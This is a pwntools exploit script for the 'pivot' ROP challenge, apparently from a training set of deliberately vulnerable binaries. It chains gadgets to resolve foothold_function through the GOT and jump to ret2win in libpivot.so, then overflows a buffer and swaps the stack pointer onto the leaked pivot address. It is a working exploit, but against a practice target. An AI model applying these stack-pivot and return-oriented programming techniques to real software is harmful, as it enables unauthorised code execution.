#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

rop = ROP(exe)
libpivot = ELF('./libpivot.so')
POP_RAX = 0x0000000000400b00
XCHG_RSP_RAX = 0x0000000000400b02
MOV_RAX_RAX = 0x0000000000400b05
ADD_RAX_RBP = 0x0000000000400b09
CALL_RAX = 0x000000000040098e
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
POP_RBP = rop.find_gadget(["pop rbp", "ret"]).address
RETURN_GADGET = rop.find_gadget(["ret"]).address
FOOTHOLD_GOT = exe.got["foothold_function"]
FOOTHOLD_PLT = exe.plt["foothold_function"]
FOOTHOLD_OFFSET = libpivot.sym.foothold_function 
RET2WIN_OFFSET = libpivot.sym.ret2win

line = io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:')
PIVOT_ADDR = int(line[-14:], 16)

# Call foothold function so its address is stored in got
payload = p64(FOOTHOLD_PLT)

# Read the actual address of foothold function from plt
payload += p64(POP_RAX)
payload += p64(FOOTHOLD_GOT)
payload += p64(MOV_RAX_RAX)

# Calculate the offset and put it in rbp, then add it to rax
payload += p64(POP_RBP)
payload += p64(RET2WIN_OFFSET - FOOTHOLD_OFFSET)
payload += p64(ADD_RAX_RBP)

# Call ret2win
payload += p64(CALL_RAX)

io.sendline(payload)

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
# Put the address where we wrote the rop chain in rax, exchange with rsp
payload = "A" * OFFSET
payload += p64(POP_RAX)
payload += p64(PIVOT_ADDR)
payload += p64(XCHG_RSP_RAX)

io.sendline(payload)

io.interactive()

